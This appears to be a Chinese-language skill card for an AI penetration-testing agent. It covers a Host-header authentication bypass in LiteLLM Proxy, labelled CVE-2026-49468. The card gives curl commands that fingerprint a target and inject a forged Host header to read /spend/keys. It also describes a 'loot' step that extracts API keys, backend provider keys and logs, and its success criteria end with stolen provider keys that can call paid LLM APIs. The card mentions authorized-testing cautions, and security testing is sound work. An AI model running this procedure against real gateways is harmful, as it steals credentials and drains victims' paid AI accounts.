---
name: 灯笼
description: >-
  LiteLLM BadHost 鉴权绕过（CVE-2026-49468）：Host 头注入读 /spend/keys 等。
  触发：LiteLLM、BadHost、/spend/keys、Host: host/?、LLM 网关、CVE-2026-49468。
  Langflow / Flowise / Ollama 走原专卡，不要对业务站发越狱包。
---

# LiteLLM BadHost 鉴权绕过

## 何时用

- 目标运行 LiteLLM Proxy（默认 `:4000`）
- 用户点名 CVE-2026-49468 / BadHost
- 侦察发现 `/spend/keys`、`/model/info`、`/health` 等 LiteLLM API
- LLM 网关鉴权绕过场景

## 真源

- Playbook：`传承/灯笼·破印.md`
- 工具：`python3 炼蛊房/litellm_badhost.py`

## 核心步骤

1. **指纹确认**：识别 LiteLLM 实例。
   ```bash
   curl -sk http://目标:4000/health -o /dev/null -w '%{http_code}\n'
   curl -sk http://目标:4000/model/info | head -c 200
   ```

2. **BadHost 绕过探测**：Host 头注入绕过鉴权。
   ```bash
   python3 炼蛊房/litellm_badhost.py probe --base http://目标:4000 --case <案卷>
   # 手工验证
   curl -sk http://目标:4000/spend/keys -H 'Host: 目标:4000/?'
   ```

3. **敏感信息抽取**：读取 API Key、模型配置、用量数据。
   ```bash
   python3 炼蛊房/litellm_badhost.py loot --base http://目标:4000 --case <案卷>
   # 关键端点
   # /spend/keys    → API 密钥列表
   # /model/info    → 模型配置与后端 provider key
   # /spend/logs    → 调用日志
   # /global/spend  → 全局用量
   ```

4. **影响评估**：确认泄露的 provider key（OpenAI/Anthropic/Azure）是否可直接调用。

5. **证据固化**：脱敏截图 + JSON 响应落案卷。

## 成功口径

| 级别 | 口径 |
|------|------|
| L1 | 确认 LiteLLM 实例存在且 /health 可达 |
| L2 | BadHost 绕过成功，读取 /spend/keys 列出 API 密钥 |
| L3 | 提取的 provider key 可直接调用后端 LLM API |

## 分流

| 场景 | 去向 |
|------|------|
| Langflow `validate/code` RCE | `langflow-unauth-rce` |
| Flowise 内部头绕过 | `flowise-internal-header-rce` |
| Ollama 未鉴权 API | `ollama-unauth` |
| LLM 越狱 / Prompt 注入 | `llm-security` |
| 客服 AI / Agent 安全 | `大灵.md` §5 |

## 不要做

- 改生产 key / 写代理路由（先问）
- 用泄露的 key 大量调用后端 API（耗余额先问）
- 对非 LiteLLM 业务站发 Host 头注入
- Langflow / Flowise / Ollama 混入本卡
